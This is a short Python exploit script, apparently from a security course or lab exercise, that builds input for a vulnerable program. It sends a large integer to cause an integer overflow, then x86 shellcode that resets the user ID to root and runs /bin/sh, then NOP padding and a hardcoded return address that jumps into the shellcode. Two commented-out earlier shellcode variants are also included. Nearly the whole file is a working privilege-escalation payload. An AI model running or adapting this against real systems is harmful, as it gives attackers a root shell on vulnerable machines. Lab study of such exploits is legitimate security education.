import sys
from struct import pack
#from shellcode import shellcode

#Different attempted shellcodes
#shellcode = b'1\xdb\x8dC\x17\x99\xcd\x80' + b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"
#shellcode = b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"

#Finally a good shellcode
#First segment comes from shellcode.py to disable the suid
#Second segment I found online
shellcode = b"1\xdb\x8dC\x17\x99\xcd\x80" + b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

#Output a large number that causes integer overflow
#Followed by shellcode
#Followed by NOP's to pad to EIP
#Followed by address to return to shellcode
sys.stdout.buffer.write(pack("<I", 0x7fffffff) + shellcode + b"\x90"*(15) + pack("<I", 0xbffea350))

